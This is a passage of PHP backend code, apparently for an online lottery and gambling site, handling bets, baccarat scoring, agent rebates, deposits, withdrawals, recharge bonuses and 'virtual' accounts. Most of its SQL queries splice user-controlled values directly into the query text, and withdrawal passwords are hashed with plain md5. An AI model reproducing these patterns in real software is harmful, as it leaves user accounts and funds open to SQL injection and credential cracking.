			if( $t1 > $max1) $max1 = $t1;
		}
		return $max1 + 1;  }
}
function arr_cha($arr) {
	$min = 1000000;
	$max = 0;

	for($i = 1; $i <=count ( $arr )-1; $i ++) {

		for($j = 0; $j < $i; $j ++) {
			if (abs1 ( $arr [$i] - $arr [$j] ) < $min)
				$min = abs1 ( $arr [$i] - $arr [$j] );
			if (abs1 ( $arr [$i] - $arr [$j] ) > $max)
				$max = abs1 ( $arr [$i] - $arr [$j] );

		}
	}
	// print_r($arr);exit();
	return array ($min, $max );

}

function SH_code($buynum) {
	if ($buynum == '豹子')
		$new_num = '111,222,333,444,555,666,777,888,999,000';
	if ($buynum == '全顺')
		$new_num = '012,123,234,345,456,567,678,789,987,876,765,654,543,432,321,210';
	if ($buynum == '杂三')
		$new_num = '024,135,246,357,468,579,975,864,753,642,531,420';
	if ($buynum == '半顺')
		$new_num = '01,12,23,34,45,56,67,78,89,98,87,76,65,54,43,32,21,10';
	if ($buynum == '对子')
		$new_num = '00,11,22,33,44,55,66,77,88';
	return Lot_k3_Num1 ( $new_num );
}

function in_arrary_number($str,$arr){
	if(in_array($str,$arr)){
		foreach( $arr as $key=>$value){
			if($value==$str) return $key;


		}
		return false;
	}
	else return false;


}

function baijiale($arr){

	$sum1=($arr[0]+$arr[1])%10;
	$sum2=($arr[3]+$arr[4])%10;
	$pai5=($arr[4]+$arr[2])%10;
	$pai6=($arr[0]+$arr[2])%10;
	if($sum2<=5) {
		$sum2+=$pai5;
		if($sum1<7){
			if($sum1<=2 )   $sum1+=$pai6;
			if($sum1==3 && $pai5!=8)   $sum1+=$pai6;
			if($sum1==4 && $pai5!=0 &&  $pai5!=1  && $pai5!=8 && $pai5!=9)   $sum1+=$pai6;
			if($sum1==5 && ($pai5>=4 && $pai5<=7) )   $sum1+=$pai6;
			if($sum1==6 && ($pai5>=6 && $pai5<=7) )   $sum1+=$pai6;
		}

	}


	return array($sum1%10,$sum2%10);


}


function SH_code_5($buynum) {
	if ($buynum == '五梅')
		$new_num = '11111,22222,33333,44444,55555,66666,77777,88888,99999,00000';
	if ($buynum == '炸弹')
		$new_num = '1111,2222,3333,4444,5555,6666,7777,8888,9999,0000';
	if ($buynum == '顺子')
		$new_num = '01234,12345,23456,34567,45678,56789,67890,09876,98765,87654,65432,54321,43210';
	if ($buynum == '三条')
		$new_num = '111,222,333,444,555,666,777,888,999,000';

	return Lot_k3_Num1 ( $new_num );
}

function set_prize($minrate,$maxrate ,$rebate,$type='ssc') {

	global  $con_system;
	$sum=$minrate+($maxrate-$minrate)*$rebate/$con_system['rebates_'.$type];

	return str_replace ( ",", "", $sum );

}

function get_user_pid($userid, $arr = array()) {
	global $db, $con_system;

	$row = $db->fetch_first ( "select * from user where `userid`='{$userid}'" );
	if (count ( $arr ) == 0)
		$arr [] = array ('userid' => $userid, 'username' => $row ['username'], 'rebates' => $row ['rebates'], 'fenhong' => $row ['fenhong'], 'isproxy' => $row ['isproxy'], 'virtual' => $row['virtual'] );
	$pid = $row ['higherid'];
	if ($pid > 0 ) {
		$row1 = $db->fetch_first ( "select * from user where `userid`='{$pid}'" );
		$arr [] = array ('userid' => $pid, 'rebates' => $row1 ['rebates'], 'username' => $row1 ['username'], 'fenhong' => $row1 ['fenhong'], 'isproxy' => $row1 ['isproxy'], 'virtual' => $row['virtual'] );
		return get_user_pid ( $pid, $arr );

	} else
		return $arr;

}



function get_user_nextid($userid,$virtual=0) {
	global $db, $con_system;
	if($virtual==1) $str1=" and `virtual`='0' ";
	else $str1='';
	$row = $db->fetch_first ( "select * from user where `userid`='{$userid}'" );
	$str = "'{$userid}'";
	$uids = "'{$userid}'";
	//echo $con_system['user_leve'];
	for($i = 0; $i < 10000; $i ++) {
		if ($uids) {

			$row1 = $db->fetch_all ( "select * from user where `higherid` in ({$uids}) {$str1}" );
			$uids = '';
			if ($row1) {

				foreach ( $row1 as $value ) {

					if ($uids == '')
						$uids = "'{$value['userid']}'";
					else
						$uids .= "," . "'{$value['userid']}'";
				}

			}
			if ($uids)
				$str .= "," . $uids;
		}
	}

	
	if(!$str) $str=0;
	return $str;
}

function get_user_nextid2($userid,$virtual=0) {
  global $res;
  $res = "";
	if(!$userid) {
		return 0;
	}
	if($virtual==1) $str1=" and `virtual`='0' ";
	else $str1='';
	$str = getNext($userid, $str1);
	return $str;
}

function getNext($userid, $condition) {
	global $db,$res;
	$row = $db->fetch_all ( "select `userid` from user where `higherid` in ({$userid}) {$condition}" );
	if($row) {
		$str = '';
		foreach ($row as $user) {
			$str .= ',' . $user['userid'];
		}
		$res .= $str;
		getNext(ltrim($str, ','), $condition);
	}

	return $userid . $res;
}

function get_user_info($userid){
	global $db;
	return $db->exec("select * from user where userid='{$userid}'");

}



function get_user_info_by_username($username){
    global $db;
    return $db->exec("select * from user where username='{$username}'");
}

function getUserIdForProxy($proxyType = 1) {
	global $db;
  	return $db->fetch_all("select userid from user where admin=0 and   `isproxy`='{$proxyType}'");
}

//用户账户
function get_user_amount($userid) {
	global $db;
  	if(!$userid) {
      	$row['total_amount'] = 0;
    	return $row;
    }
	if(is_string($userid)) {
		$row = $db->fetch_first ( "select *,(`hig_amount` + `frze_amount`) as total_amount from user_bank where `userid`={$userid}" );
	} else if(is_array($userid) && !empty($userid)) {
		$userid = implode(',', $userid);
		$row = 	$row = $db->fetch_first ( "select SUM(`hig_amount` + `frze_amount`) as total_amount from user_bank where `userid` in ({$userid})" );
	}

//	$arr = array ('hig_amount', 'low_amount', 'frze_amount', 'yk_amount' );
//	foreach ( $arr as $key => $value ) {
//		if (! $row [$value])
//			$row ['value'] = '0.000';
//
//		$row [$value] = str_replace ( ',', '', number_show ( $row [$value], 3 ) );
//
//	}

//	$row ['total_amount'] = $row ['hig_amount']+$row['frze_amount'];
	return $row;
}


function get_user_num($fromid,$toid,$num=0){
	global $db;
	if($fromid==$toid) return 0;
	$num++;
	$row= $db->exec("select higherid from user where userid='{$fromid}'");
	if($row['higherid']==$toid){

		return $num;
	}
	else{
		if($row['higherid']==0) return 0;
		else
			return  get_user_num($row['higherid'],$toid,$num);
	}


}

//获取资金统计


function get_bank_sum($userid, $cate, $begintime = '', $endtime = '',$virtual=0) {

	global $db;
	if(!$userid) {
		return 0;
	}
	if($cate) {
		$str = ' and cate in('. $cate . ')';
	} else {
		$str = '';
	}

//	$str = '';
//	if (strpos ( $cate, ',' ) !== false) {
//		$ct = explode ( ",", $cate );
//		$str .= " and ( ";
//		foreach ( $ct as $key => $value ) {
//			if ($key == 0)
//				$str .= "  cate='{$value}' ";
//			else
//				$str .= " or cate='{$value}' ";
//		}
//		$str .= " ) ";
//	} else {
//		$str .= " and cate='{$cate}' ";
//
//	}


//	var_dump($str);exit;

	if ($begintime)
		$str .= " and creatdate>='{$begintime}'";
	if ($endtime)
		$str .= " and creatdate<='{$endtime}'";

	$row = $db->fetch_first ( "select sum(moneys) as sum from user_bank_log where 1=1 {$str} and `userid` in ({$userid})" );
	if (! $row ['sum'])
		$row ['sum'] = '0.00';
	return $row ['sum'];
}


function bdUrlAPI($type, $url) {
	if ($type)
		$baseurl = 'http://dwz.cn/create.php';
	else
		$baseurl = 'http://dwz.cn/query.php';
	$ch = curl_init ();
	curl_setopt ( $ch, CURLOPT_URL, $baseurl );
	curl_setopt ( $ch, CURLOPT_POST, true );
	curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true );
	if ($type)
		$data = array ('url' => $url );
	else
		$data = array ('tinyurl' => $url );
	curl_setopt ( $ch, CURLOPT_POSTFIELDS, $data );
	$strRes = curl_exec ( $ch );
	curl_close ( $ch );
	$arrResponse = json_decode ( $strRes, true );
	if ($arrResponse ['status'] != 0) {
		echo 'ErrorCode: [' . $arrResponse ['status'] . '] ErrorMsg: [' . iconv ( 'UTF-8', 'GBK', $arrResponse ['err_msg'] ) . "]<br/>";
		return 0;
	}
	if ($type)
		return $arrResponse ['tinyurl'];
	else
		return $arrResponse ['longurl'];
}

function user_add($data) {
	global $db, $con_system;

	$data ['modes'] = 1800 + 20 * $data ['rebate'];


	$time = date ( 'Y-m-d H:i:s' );
	$db->query ( "insert into `user`(`registertime`,`status`) values('$time',0)" );

	if ($db->affected_rows () > 0) {
		$userid = $db->insert_id ();


		$group=  $db->exec("select id from user_group order by score asc limit 0,1");
		$data['groupid']=$group['id'];
		$data['avatar']=rand(0,15);
		foreach ( $data as $key => $value ) {
			if($key!='field')
				$db->query ( "update `user` set `{$key}`='{$value}' where userid='{$userid}'" );
		}

		$db->query ( "insert into `user_bank`(`userid`,`password`) values('{$userid}','{$data['password']}')" );

		if($data['code']) {
			$code=$db->exec("select * from user_url where url='{$data['code']}'");
			if($code['istry']==1 and $code['money']>0){

				$db->query("update user_bank set hig_amount='{$code['money']}' where userid='{$userid}'");

			}

			if($code['virtual']==1){

				$db->query("update `user` set virtual='1' where userid='{$userid}'");

			}


			$db->query ( "update `user_url` set `num`=num+1 where url='{$data['code']}'" );

		}
		if(count($data['field'])>0){

			foreach ($data['field'] as $key=>$value){
				if($value!='')
					field_add($userid,$key,$value);
			}

		}
		return $userid;
	}

	else
		return false;

}


function field_add($userid,$fieldid,$value){
	global $db;

	$row=  $db->exec("select * from user_field where userid='{$userid}' and fieldid='{$fieldid}'");
	if($row['id']>0){

		$db->query("update user_field set `value`='{$value}' where id='{$row['id']}'");

	}else{

		$db->query("insert into  user_field (userid,fieldid,`value`) values('{$userid}','{$fieldid}','{$value}')");
	}

	return true;
}
function field_show($userid,$fieldid){
	global $db;

	$row=  $db->exec("select * from user_field where userid='{$userid}' and fieldid='{$fieldid}'");


	return $row['value'];
}

function recharge_use($userid,$id){
	global $db;
	$card = $db->exec( "select * from card where id='{$id}' " );
	if($card){
		$money=$card['money'];
		$iid=add_charge($userid,$money,'card',0,'充值卡充值');
		if($iid>0){

			add_money($userid, $money,'Recharge_to_system','充值卡充值');
			$db->query ( "update user_funds set status=1,amountafter=amountafter+$money where id='{$iid}'" );

			add_score($userid,$money);
			$now=time();
			$db->query("update card set userid='{$userid}',usetime='{$now}',status='1' where id='{$id}'");
		}

	}


}


//获得奖金


function get_prize($playkey, $ckey, $modes, $wei = '') {
	global $db;
	$row = $db->fetch_first ( "select * from game_set where playKey='{$playkey}' and ckey='{$ckey}' " );
	$prize = $row ['prize'];
	//	echo "select * from game_set where playKey='{$playkey}' and ckey='{$ckey}' ";
	if ($prize) {

		if (strpos ( $prize, '|' ) !== false and $wei > 0) {
			$prize = explode ( "|", $prize );
			$prize = $prize [$wei];

		}
		return set_prize ( $prize, $modes );
	}

}

//盈亏统计
function get_yingkui($userid, $begintime, $endtime, $tx = '',$virtual=0) {
	global $db;

	$arr = array ();
	if ($tx == 1)
		$userid = get_user_nextid ( $userid,$virtual  );

	if ($begintime)
		$str .= " and creatdate>='{$begintime}'";
	if ($endtime)
		$str .= " and creatdate<='{$endtime}'";
	// 充值
	$recharge_row = $db->fetch_first ( "SELECT SUM(money) as sum FROM `user_funds` WHERE 1=1 {$str} AND `cate` = 'recharge' AND `status` = 1  and userid in ({$userid})" );
	$arr ['recharge'] = $recharge_row['sum'];

	
	// 提现
	$mention_row = $db->fetch_first ( "SELECT SUM(money) as sum FROM `user_funds` WHERE 1=1 {$str} AND `cate` = 'platform' AND `status` = 1 and userid in ({$userid})" );
	$arr ['mention'] = $mention_row['sum'];



	//中奖
	$arr ['active'] = get_bank_sum ( $userid, "'active'", $begintime, $endtime );
	// 投注
	$arr ['chase_back'] = get_bank_sum ( $userid, "'hig_chase_back','hig_buy_chase_back','hig_buy_back'", $begintime, $endtime )
											- get_bank_sum ( $userid, "'hig_buy_back_fee'", $begintime, $endtime );


	$row1 = $db->fetch_first( "select sum(money) as money from game_buylist where 1=1 and  creatdate>'{$begintime}' and creatdate<='{$endtime}'  and is_succeed='yes'  and (status='1' or status='2' or status='3') and userid in ({$userid}) " );
	if (! $row1 ['money'])
		$row1 ['money'] = '0.00';
	$arr ['buy'] = $row1 ['money']+ get_bank_sum ( $userid, "'hm_buy'", $begintime, $endtime )- get_bank_sum ( $userid, "'hm_back'", $begintime, $endtime );

	$row1 = $db->fetch_first ( "select sum(pri_money) as money from game_buylist where 1=1 and  creatdate>'{$begintime}' and creatdate<='{$endtime}' and is_succeed='yes' and (status='1' or status='2' or status='3') and pri_money>0  and  userid in ({$userid})" );
	if (! $row1 ['money'])
		$row1 ['money'] = '0.00';
	$arr ['prize'] = $row1 ['money'];


	$from = strtotime ( $begintime );
	$to = strtotime ( $endtime );
	$row = $db->fetch_first ( "select sum(money) as sum from user_fandian_log where 1=1 and time>'$from' and time<='{$to}' and uid in ({$userid}) " );
	$arr ['rebate']=$row['sum'];
	$arr ['sum'] = $arr ['rebate'] + $arr ['active'] + $arr ['prize']- $arr ['buy'];

	foreach ( $arr as $key => &$value ) {
		$arr [$key] = number_show($value, 3 );
	}

	return $arr;
}

//盈亏统计
function get_yingkui_new($userid, $begintime, $endtime, $tx = '',$virtual=0, $userlist = null) {
	global $db;

	$arr = array ();
	if ($tx == 1) {
		$userid = $userlist == null ? get_user_nextid ( $userid,$virtual  ) : $userlist;
	}

	// 充值
	// $arr ['recharge'] = get_bank_sum ( $userid, "'Recharge_to_system','Recharge_online','hig_add_admin', 'hig_lost_admin'", $begintime, $endtime ,$virtual);
		// +get_bank_sum ( $userid, "'hig_lost_admin'", $begintime, $endtime ,$virtual);

	if ($begintime)
		$str .= " and creatdate>='{$begintime}'";
	if ($endtime)
		$str .= " and creatdate<='{$endtime}'";
	$recharge_row = $db->fetch_first ( "SELECT SUM(money) as sum FROM `user_funds` WHERE 1=1 {$str} AND `cate` = 'recharge' AND `status` = 1 and  userid in ({$userid})" );
	$arr ['recharge'] = $recharge_row['sum'];


	$mention_row = $db->fetch_first ( "SELECT SUM(money) as sum FROM `user_funds` WHERE 1=1 {$str} AND `cate` = 'platform' AND `status` = 1 and userid in ({$userid})" );
	$arr ['mention'] = $mention_row['sum'];
	// 提现
	// $arr ['mention'] = get_bank_sum ( $userid, "'mention_from_system'", $begintime, $endtime );
	//中奖
	$arr ['active'] = get_bank_sum ( $userid, "'active'", $begintime, $endtime );
	// 投注
	$arr ['chase_back'] = get_bank_sum ( $userid, "'hig_chase_back','hig_buy_chase_back','hig_buy_back'", $begintime, $endtime )
		- get_bank_sum ( $userid, "'hig_buy_back_fee'", $begintime, $endtime );

	$row1 = $db->fetch_first( "select sum(money) as money from game_buylist where 1=1 and  creatdate>'{$begintime}' and creatdate<='{$endtime}'  and is_succeed='yes'   and (status='1' or status='2' or status='3') and userid in ({$userid})" );
	if (! $row1 ['money'])
		$row1 ['money'] = '0.00';
	$arr ['buy'] = $row1 ['money']+ get_bank_sum ( $userid, "'hm_buy'", $begintime, $endtime )- get_bank_sum ( $userid, "'hm_back'", $begintime, $endtime );

	$row1 = $db->fetch_first ( "select sum(pri_money) as money from game_buylist where 1=1 and  creatdate>'{$begintime}' and creatdate<='{$endtime}'  and is_succeed='yes'   and (status='1' or status='2' or status='3') and pri_money>0 and userid in ({$userid})" );
	if (! $row1 ['money'])
		$row1 ['money'] = '0.00';
	$arr ['prize'] = $row1 ['money'];


	$from = strtotime ( $begintime );
	$to = strtotime ( $endtime );
//	var_dump($userid);exit;
	$row = $db->fetch_first ( "select sum(money) as sum from user_fandian_log where 1=1 and time>'$from' and time<='{$to}' and uid in ({$userid})" );
	$arr ['rebate']=$row['sum'];
	$arr ['sum'] = $arr ['rebate'] + $arr ['active'] + $arr ['prize']- $arr ['buy'];

	foreach ( $arr as $key => &$value ) {
		$arr [$key] = number_show($value, 3 );
	}

	return $arr;
}



function get_task($type) {
	global $db, $con_system;

	$begindate = strtotime ( date ( 'Y-m-d' ) . " 00:00:00" );
	$enddate = strtotime ( date ( 'Y-m-d' ) . " 23:59:59" );
	;
	$now = time ();
	$run = 0;

	$task_time = getsql::sys ( 'task_time' );

	//if(time()-$task_time['task_time']>=5){


	$row = $db->fetch_first ( "select * from sys_task where time>='{$begindate}' and time<='{$enddate}'" );
	if ($row) {
		if ($row [$type] == 0) {

			$run = - 1;
			$task_id = $row ['id'];
		} else
			$run = 0;

	} else {

		mysql_query ( "insert into sys_task (time,fenhong,fandian) values('{$now}','0','0') " );
		if (mysql_affected_rows () > 0) {
			$task_id = mysql_insert_id ();
			$run = - 1;
		}
	}
	if ($run == - 1) {

		mysql_query ( "update sys_task set `{$type}`='1' where id='{$task_id}' " );
		if (mysql_affected_rows () > 0) {

			$run = 1;
			if ($type == 'fandian')
				mysql_query ( "update sys_task set fandiantime='{$now}' where id='{$task_id}' " );
			if ($type == 'fenhong')
				mysql_query ( "update sys_task set fenhongtime='{$now}' where id='{$task_id}' " );

		} else
			$run = 0;

	}
	return array ('run' => $run, 'task_id' => $task_id );
}









//检测提现密码


function check_bank_pwd($userid, $password) {

	global $db;

	$password = md5 ( $password );
	$row = $db->fetch_first ( "select * from user_bank where userid='{$userid}' and password='{$password}'" );
	if ($row)
		return true;
	else
		return false;

}

function get_randcode() {
	$code = rand ( 10000, 99999 );
	$from = date ( 'Y-m-d H:i:s', time () - 48 * 3600 );
	global $db;
	$row = $db->fetch_first ( "select * from user_funds where remark='{$code}'" );
	if ($row)
		return get_randcode ();
	else
		return $code;
}

//充值活动


function active_charge($userid, $amount) {
	global $db, $_SESSION, $con_system;
	//充值送金
	$active = $db->fetch_first ( "select * from `active` where userid='{$userid}' and  `type`='charge' and complate='0'  and charge='0'" );
	if ($active) {
		$money = $amount * $con_system ['active_charge_pre'] / 100;
		$sum = $amount + $money;
		$pay_pre = $con_system ['pay_pre'];
		$money2 = $money * $pay_pre / 100;
		$money1 = $money - $money2;
		$strSqls = "update user_bank set hig_amount=hig_amount+$money1,low_amount=low_amount+$money2,charge=charge+$money,status='1' where userid='$userid'";
		mysql_query ( $strSqls );
		$time = time ();
		getsql::banklog ( $money, 'active', $userid, '充值送现金活动奖励' );
		mysql_query ( "update `active` set charge='{$sum}',time='{$time}' where id='{$active['id']}'" );
	}

	return true;
}

//充值


function add_charge($userid, $amount, $bankname, $online = '0', $mark = '') {
	global $db;
	$bank=array();
	$bank['type']='hand';
	$user_bank = $db->fetch_first ( "select * from user_bank where userid='{$userid}'" );
	if ($online == 1) {
		$bank ['bankname'] = '线上支付';
		$bank ['realname'] = $mark;
		$bank ['banknum'] = '';

		$bank['type']='online';
		$status = 0;
	} else if ($online == 2) {
		$bank ['bankname'] = '聊天室';
		$status = 0;
		$bank ['banknum'] = '';
		$bank ['realname']='';
		$bank['type']='chat';
	}else if ($bankname == 'card') {
		$bank ['bankname'] = '充值卡';
		$status = 0;
		$bank ['banknum'] = '';
		$bank ['realname']='';
		$bank['type']='card';
	}
	else{
		$bank = $db->fetch_first ( "select * from system_bank where id='{$bankname}'" );

		$status = '0';
		$bank['type']='hand';
	}
	$remark=$mark;
	$nowtime = date ( "Y-m-d H:i:s" );

	if (! $user_bank ['low_amount']) $user_bank ['low_amount'] = '0.00';
	$order_sn =  time () . rand ( 1000, 9999 );
	$charge_sum=$user_bank['charge_sum'];
	if($charge_sum==0) $first=1;
	else $first=0;

	$array = array ('userid' => $userid, 'money' => $amount, 'cate' => 'recharge', 'Man_remark' => $remark, 'creatdate' => $nowtime, 'realname' => $bank ['realname'], 'banknum' => $bank ['banknum'], 'bankname' => $bank ['bankname'], 'status' => $status, 'hig_amount' => $user_bank ['hig_amount'],'amountafter' => $user_bank ['hig_amount'], 'low_amount' => $user_bank ['low_amount'], 'online' => $online, 'order_sn' => $order_sn,'first'=>$first,'type'=>$bank['type'] );

	$db->insert ( "user_funds", $array );

	return $db->insert_id ();

}

//提现


function add_platform($userid, $amount,$bank_id,$status = 0) {
	global $db;
	$bank = $db->fetch_first ( "select * from user_bank_list where userid='{$userid}'  and id='{$bank_id}'" );
	$db->query ( "update user_bank set hig_amount=hig_amount-$amount,frze_amount=frze_amount+$amount where userid='{$userid}'" );

	$user_bank = $db->fetch_first ( "select * from user_bank where userid='{$userid}'" );
	$nowtime = date ( "Y-m-d H:i:s" );
	if (! $user_bank ['low_amount'])
		$user_bank ['low_amount'] = '0.00';
	$order_sn = 'PLAT-' . time () . rand ( 10000, 99999 );

	$bankinfo=serialize($bank);
	$amountafter=$user_bank['hig_amount'];
	$hig_amount=$amountafter+$amount;

	$array = array ('userid' => $userid, 'money' => $amount, 'cate' => 'platform',  'creatdate' => $nowtime, 'realname' => $bank ['realname'], 'banknum' => $bank ['banknum'], 'bankname' => $bank ['bankname'],  'bankinfo' =>$bankinfo, 'status' => $status, 'hig_amount' => $hig_amount, 'amountafter' => $amountafter, 'low_amount' => $user_bank ['low_amount'], 'order_sn' => $order_sn );

	$db->insert ( "user_funds", $array );
	$id = $db->insert_id ();
	if($id>0){


		getsql::banklog ($amount, 'tixian1', $userid, "申请提现,受理中");

	}


	return $id;

}

//充值类型
function get_bank_list() {
	global $db, $recharge_type_arr1;

	foreach ( $recharge_type_arr1 as $key=> $value ) {
		$bank_list [$key] = $value ;
	}

	return $bank_list;

}

//提现类型
function get_platfrom_type() {
	
	return ['' => '全部','card' => '银行卡', 'green' => '绿色通道'];

}

//在线支付

function agree_online_money($id,$remark=''){

	global $db,$con_system;

	$funds = $db->fetch_first ( "select * from user_funds where id='{$id}'" );
	$perid = $funds ['userid'];
	$money = $funds ['money'];

	$db->query ( "update user_funds set status=1 where id='{$id}'" );

	if ($db->affected_rows () > 0) {


		$pay_pre = $con_system ['pay_pre'];

		$money2 = $money * $pay_pre / 100;
		$strSqls = "update user_bank set hig_amount=hig_amount+$money,low_amount=low_amount+$money2 ,charge=charge+$money,charge_sum=charge_sum+$money where userid='$perid'";

		$db->query ( $strSqls );
		getsql::banklog ( $money, 'Recharge_to_system', $perid, '线上付款成功' );
		$bank = $db->fetch_first ( "select * from user_bank where userid='{$perid}'" );
		$db->query ( "update user_funds set amountafter='{$bank['hig_amount']}',low_amount='{$bank['low_amount']}' where id='{$id}'" );

		add_score($perid,$money);
	}
	return true;



}

function add_score($userid,$score){
	global $db,$con_system;
	$score=$score*$con_system['score_pre']/100;
	$db->query ( "update user set `score`=score+{$score} where userid='{$userid}'" );
	$userinfo = $db->exec ( "select * from user where userid='{$userid}'" );

	$group_sys = $db->exec ( "select id from user_group where id='{$userinfo['groupid']}' and sys = 1" );

	if (!$group_sys) {
		
		$group=$db->exec("select * from user_group where score<='{$userinfo['score']}' and sys='0' order by score desc limit 0,1");
		if($group['id']!=$userinfo['groupid']){

			$db->query ( "update user set `groupid`='{$group['id']}' where userid='{$userid}'" );
		}
	}


}


function  fafang_group_prize($userid){
	global $db,$con_system;
	$userinfo = $db->exec ( "select * from user where userid='{$userid}'" );

	$group=$db->exec("select * from user_group where score<='{$userinfo['score']}' order by score desc limit 0,1");
	if($group['id']!=$userinfo['groupid1']){
		$user_group=$db->exec("select * from user_group where id='{$userinfo['groupid1']}'");
		$row=$db->exec("select sum(prize) as  sum from user_group where score<={$userinfo['score']} and score>=$user_group[score] ");
		$prize=$row['sum']-$user_group['prize'];
		$db->query ( "update user set `groupid1`='{$group['id']}' where userid='{$userid}'" );
		if($prize>0){
			$strSqls = "update user_bank set hig_amount=hig_amount+$prize,low_amount=low_amount+$prize where userid='$userid'";
			$db->query ( $strSqls );
			getsql::banklog ( $prize, 'active', $userid, "领取VIP晋级奖励" );
			$db->query("insert into active(userid,type,time,charge,gid1,gid2,score) VALUES ('{$userid}','vip','".time()."','{$prize}','{$userinfo['groupid1']}','{$group['id']}','{$userinfo['score']}')");
		}
	}

}





function online_charge($userid, $amount, $mark, $order_sn) {
	global $db, $con_system, $_SESSION;


	add_money($userid,$amount,'Recharge_to_system',$mark);

//	$strSqls = "update user_bank set hig_amount=hig_amount+$amount ,charge=charge+$amount where userid='{$userid}'";
//	mysql_query ( $strSqls );
//	$user_bank = $db->fetch_first ( "select * from user_bank where userid='{$userid}'" );
//	$nowtime = Core_Fun::nowtime ();
//	$array = array ('userid' => $_SESSION ['userid'], 'money' => $amount, 'cate' => 'recharge', 'remark' => $mark, 'creatdate' => date ( "y-m-d H:i:s" ), 'realname' => $mark, 'banknum' => '', 'bankname' => '第三方支付', 'status' => '1', 'online' => '1', 'hig_amount' => $user_bank ['hig_amount'], 'low_amount' => $user_bank ['low_amount'], 'order_sn' => $order_sn );

	if ($_SESSION ['charge_id'])
		$db->query ( "update user_funds  set status=1 where id='{$_SESSION['charge_id']}'" );

	//$db->insert(DB_PREFIX."user_funds",$array);


	//getsql::banklog ( $amount, 'Recharge_to_system', $userid, $mark );

}

//同意充值


function agree_charge($id, $remark = '') {
	global $db, $con_system;
	$funds = $db->fetch_first ( "select * from user_funds where id='{$id}'" );
	$perid = $funds ['userid'];
	$money = $funds ['money'];

	$db->query ( "update user_funds set status=1 where id='{$id}'" );

	if ($db->affected_rows () > 0) {
		$bank=$db->exec("select * from user_bank where userid='{$perid}'");
		$charge_sum=$bank['charge_sum'];
		if($charge_sum==0) $first=1;else  $first=0;
		$db->query ( "update user_funds set `first`='{$first}' where id='{$id}'" );
		if ($con_system ['active_charge1_begin'] <= $funds ['creatdate'] and $con_system ['active_charge1_end'] >= $funds ['creatdate'])
			active_charge1 ( $perid, $money );
		$pay_pre = $con_system ['pay_pre'];


       if($funds['type'] == 'chat'){
       
			$money2 = $money ;
       }else{
			$money2 = $money * $pay_pre / 100;
       	
       }
         $charge_sum=$charge_sum+$money;
		//$money1 = $money - $money2;


		$strSqls = "update user_bank set hig_amount=hig_amount+$money,low_amount=low_amount+$money2 ,charge=charge+$money,charge_sum='{$charge_sum}' where userid='$perid'";

		$db->query ( $strSqls );
		getsql::banklog ( $money, 'Recharge_to_system', $perid, '充值成功' );
		cumulativeRecharge($perid, $funds['payname'], $money);
//		$zeroTime = date('Y-m-d H:i:s', strtotime(date('Y-m-d')));
//		$isDayFirst = $db->fetch_first ( "select count(*) as `count` from user_funds where cate='recharge' and (userid='{$perid}' or payname='{$funds['payname']}') and creatdate>='{$zeroTime}' and status=1 and `type` in ('green', 'hand')" );
//		if ($isDayFirst['count'] <= 1) {
//			$firstRechargeMoney = 0;
//			if ($money >= 500 and $money < 1000) {
//				$firstRechargeMoney = 18;
//			} elseif ($money >= 1000 and $money < 5000) {
//				$firstRechargeMoney = 28;
//			}elseif ($money >= 5000 and $money < 10000) {
//				$firstRechargeMoney = 68;
//			}elseif ($money >= 10000 and $money < 30000) {
//				$firstRechargeMoney = 118;
//			}elseif ($money >= 30000 and $money < 50000) {
//				$firstRechargeMoney = 388;
//			}elseif ($money >= 50000 and $money < 100000) {
//				$firstRechargeMoney = 688;
//			}elseif ($money >= 100000 and $money < 200000) {
//				$firstRechargeMoney = 1888;
//			}elseif ($money >= 200000 and $money < 300000) {
//				$firstRechargeMoney = 3888;
//			}elseif ($money >= 300000) {
//				$firstRechargeMoney = 6888;
//			}
//			if ($firstRechargeMoney > 0) {
//				$strSqls = "update user_bank set hig_amount=hig_amount+$firstRechargeMoney,charge=charge+$firstRechargeMoney where userid='$perid'";
//				$db->query ( $strSqls );
//				$insSql = "insert into active (userid, time, type, charge) values ('{$perid}','".time()."','gift','{$firstRechargeMoney}')";
//				$db->query ( $insSql );
//				getsql::banklog ( $firstRechargeMoney, 'active', $perid, '首次充值赠送' );
//			}
//		}
		$bank = $db->fetch_first ( "select * from user_bank where userid='{$perid}'" );
		$db->query ( "update user_funds set amountafter='{$bank['hig_amount']}',low_amount='{$bank['low_amount']}',Man_remark='{$remark}' where id='{$id}'" );
		$user = $db->fetch_first ( "select * from user where userid='{$perid}'" );
		add_adminlog ( "同意{$user['username']}的{$money}元充值" );
		if($con_system['auto_msg']==1){

			$content = "您[" . $funds ['creatdate'] . "]提交的充值请求已成功处理!";
			send_msg($perid, "充值提醒",$content);
		}


		if ($con_system ['active_charge_begin'] <= $funds ['creatdate'] and $con_system ['active_charge_end'] >= $funds ['creatdate'])
			active_charge ( $perid, $money );
		if($_SESSION ['admin_id'])
		{

			$admin = $db->fetch_first ( "select * from user where userid='{$_SESSION ['admin_id']}'" );
			$db->query ( "update user_funds set admin='{$admin['username']}' where id='{$id}'" );
		}
		if($funds['type']=='chat'){

			$url=get_chaturl('apk/index.php')."&act=recharge_order&id={$id}&type=1&content=";;

			file_get_contents($url);

		}
		else    add_score($perid,$money);
	}
	return true;

}

function receive($type, $num, $maxMoney,$money,$userId) {
	global $db;
  	if ($num > 7) {
    	$money = calc($type, $maxMoney);
    } else {
    	$money = calc($type, $money);
    }
	$strSqls = "update user_bank set hig_amount=hig_amount+$money,low_amount=low_amount+$money,charge=charge+$money,charge_sum=charge_sum+$money where userid='$userId'";
	$db->query ( $strSqls );
	$insSql = "insert into active (userid, time, type, charge) values ('{$userId}','".time()."','gift','{$money}')";
	$db->query ( $insSql );
	$dateTime = date('Y-m-d H:i:s');
	$db->query("update `cumulative_recharge` set num=0,updated_at='{$dateTime}',max_money=0,money=0, sign_data = '' where user_id='{$userId}'");
	if($num == 1){
		$msg = '首次充值奖励';
	} else {
		$msg = '累计充值赠送彩金，累计天数：';
		$msg .=  $num;
	}
	getsql::banklog ( $money, 'active', $userId, $msg );
	return true;
}

function calc($type, $maxMoney) {
	if ($type < 7) {
		if ($maxMoney >= 500 and $maxMoney < 1000) {
			$money = 18;
		} elseif ($maxMoney >= 1000 and $maxMoney < 5000) {
			$money = 28;
		}elseif ($maxMoney >= 5000 and $maxMoney < 10000) {
			$money = 68;
		}elseif ($maxMoney >= 10000 and $maxMoney < 30000) {
			$money = 118;
		}elseif ($maxMoney >= 30000 and $maxMoney < 50000) {
			$money = 388;
		}elseif ($maxMoney >= 50000 and $maxMoney < 100000) {
			$money = 688;
		}elseif ($maxMoney >= 100000 and $maxMoney < 200000) {
			$money = 1888;
